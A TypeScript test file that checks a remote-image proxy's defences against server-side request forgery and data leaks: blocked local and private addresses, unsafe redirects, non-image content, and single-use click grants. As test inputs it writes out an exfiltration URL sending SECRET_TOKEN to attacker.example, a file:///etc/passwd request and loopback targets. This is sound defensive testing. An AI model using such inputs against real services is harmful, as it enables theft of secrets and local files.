import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { RemoteImageGrant } from "@agent-rishi/contracts";
import { Hono } from "hono";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { publicFetch } from "../src/network/public-fetch";
import { remoteImageRoutes } from "../src/routes/remote-image";
import { errorResponse } from "../src/routes/validate";
import { ServiceError } from "../src/services/errors";
import { fetchRemoteImage } from "../src/services/remote-image";
import { RemoteImageGrants } from "../src/services/remote-image-grants";

const PNG = Buffer.from("89504e470d0a1a0a", "hex");
let images: Server;
let port: number;

beforeAll(async () => {
  images = createServer((req, res) => {
    const routes: Record<string, () => void> = {
      "/a.png": () => res.writeHead(200, { "content-type": "image/png" }).end(PNG),
      "/page": () => res.writeHead(200, { "content-type": "text/html" }).end("<script>1</script>"),
      "/big": () => res.writeHead(200, { "content-type": "image/png" }).end(Buffer.alloc(64)),
      "/hop": () => res.writeHead(302, { location: "/a.png" }).end(),
      "/to-local": () => res.writeHead(302, { location: `http://[::1]:${port}/a.png` }).end(),
      "/missing": () => res.writeHead(404).end(),
    };
    (routes[req.url ?? ""] ?? routes["/missing"])?.();
  });
  await new Promise<void>((resolve) => images.listen(0, "127.0.0.1", resolve));
  port = (images.address() as AddressInfo).port;
});
afterAll(() => new Promise<void>((resolve) => images.close(() => resolve())));

/**
 * `https://images.test` stands for a public host, served by the local test server; every other
 * URL goes to the real `publicFetch`, which refuses this machine and private networks.
 */
const seen: string[] = [];
const scripted: typeof fetch = (input, init) => {
  const url = new URL(String(input));
  seen.push(url.href);
  if (url.host !== "images.test") return publicFetch(input, init);
  return fetch(`http://127.0.0.1:${port}${url.pathname}`, { ...init, redirect: "manual" });
};

const failure = (promise: Promise<unknown>) =>
  promise.then(
    () => null,
    (error: unknown) => (error instanceof ServiceError ? error.code : String(error)),
  );

describe("remote images (#317)", () => {
  it("never reaches this machine or a private network, by address, name or redirect", async () => {
    for (const url of [
      `http://127.0.0.1:${port}/a.png`,
      `https://localhost:${port}/a.png`,
      "https://[::1]/a.png",
      "https://192.168.1.1/a.png",
    ]) {
      expect(await failure(fetchRemoteImage(url)), url).toBe("address_blocked");
    }
    const redirected = fetchRemoteImage("https://images.test/to-local", { fetch: scripted });
    expect(await failure(redirected)).toBe("address_blocked");
  });

  it("returns images only, over https, within the size limit, following redirects", async () => {
    seen.length = 0;
    expect(await fetchRemoteImage("http://images.test/hop", { fetch: scripted })).toEqual({
      contentType: "image/png",
      body: PNG,
    });
    expect(seen).toEqual(["https://images.test/hop", "https://images.test/a.png"]);
    const get = (path: string, maxBytes?: number) =>
      failure(fetchRemoteImage(`https://images.test${path}`, { fetch: scripted, maxBytes }));
    expect(await get("/page")).toBe("not_an_image");
    expect(await get("/big", 32)).toBe("too_large");
    expect(await get("/missing")).toBe("fetch_failed");
    expect(await failure(fetchRemoteImage("https://user:pw@example.com/a.png"))).toBe("bad_url");
    expect(await failure(fetchRemoteImage("ftp://example.com/a.png"))).toBe("bad_url");
  });

  it("serves the image inert: no sniffing, no script, sandboxed", async () => {
    const { app, click } = imageApp("image/svg+xml");
    const { id } = await click("https://a.example/x.svg");
    const res = await app.request(`/${id}`);
    expect(res.status).toBe(200);
    expect(res.headers.get("content-type")).toBe("image/svg+xml");
    expect(res.headers.get("x-content-type-options")).toBe("nosniff");
    expect(res.headers.get("content-security-policy")).toContain("sandbox");
    expect(Buffer.from(await res.arrayBuffer())).toEqual(PNG);
    const bad = await app.request("/", json({ url: "file:///etc/passwd" }));
    expect(bad.status).toBe(400);
  });
});

describe("Load image grants (#341)", () => {
  it("refuses a direct ?url= request: only fetches the app started after a click", async () => {
    // An <img src="/api/remote-image?url=…"> that slipped into Markdown or any other HTML is
    // same-origin, so the CSP lets it through and the install cookie authorizes it.
    const { app, fetched } = imageApp();
    const leak = "https://attacker.example/p.png?d=SECRET_TOKEN";
    const res = await app.request(`/?url=${encodeURIComponent(leak)}`);
    expect(res.status).toBe(404);
    // An <img> can only GET: the click's POST needs a JSON body.
    expect((await app.request("/", { method: "POST", body: `url=${leak}` })).status).toBe(400);
    expect(fetched).toEqual([]);
  });

  it("fetches exactly the clicked URL, once", async () => {
    const { app, click, fetched } = imageApp();
    const url = "https://images.example/a.png?size=2";
    const grant = await click(url);
    expect(RemoteImageGrant.parse(grant)).toEqual(grant);
    expect((await app.request(`/${grant.id}`)).status).toBe(200);
    expect(fetched).toEqual([url]);
    const again = await app.request(`/${grant.id}`);
    expect(again.status).toBe(404);
    expect(await again.json()).toMatchObject({ error: { code: "image_not_found" } });
    expect(fetched).toEqual([url]);
  });

  it("refuses an unknown or expired id", async () => {
    let now = Date.parse("2026-11-14T10:00:00Z");
    const grants = new RemoteImageGrants({ now: () => now, ttlMs: 60_000 });
    const { app, click, fetched } = imageApp("image/png", grants);
    expect((await app.request("/unknown-id-0123456789")).status).toBe(404);
    const { id, expiresAt } = await click("https://images.example/a.png");
    expect(expiresAt).toBe("2026-11-14T10:01:00.000Z");
    now += 60_000;
    expect((await app.request(`/${id}`)).status).toBe(404);
    expect(fetched).toEqual([]);
  });

  it("keeps a bounded number of ids, dropping the oldest", () => {
    const grants = new RemoteImageGrants({ max: 2 });
    const first = grants.grant("https://images.example/1.png");
    const second = grants.grant("https://images.example/2.png");
    const third = grants.grant("https://images.example/3.png");
    expect(new Set([first.id, second.id, third.id]).size).toBe(3);
    expect(grants.take(first.id)).toBeUndefined();
    expect(grants.take(second.id)).toBe("https://images.example/2.png");
    expect(grants.take(third.id)).toBe("https://images.example/3.png");
  });
});

const json = (body: unknown): RequestInit => ({
  method: "POST",
  headers: { "content-type": "application/json" },
  body: JSON.stringify(body),
});

/** The image routes with a recording downloader, and the UI's click. */
function imageApp(contentType = "image/png", grants?: RemoteImageGrants) {
  const fetched: string[] = [];
  const app = new Hono()
    .onError((error, c) => errorResponse(error, c))
    .route(
      "/",
      remoteImageRoutes({
        grants,
        fetchImage: async (url) => {
          fetched.push(url);
          return { contentType, body: PNG };
        },
      }),
    );
  const click = async (url: string): Promise<RemoteImageGrant> => {
    const res = await app.request("/", json({ url }));
    expect(res.status).toBe(200);
    return (await res.json()) as RemoteImageGrant;
  };
  return { app, click, fetched };
}
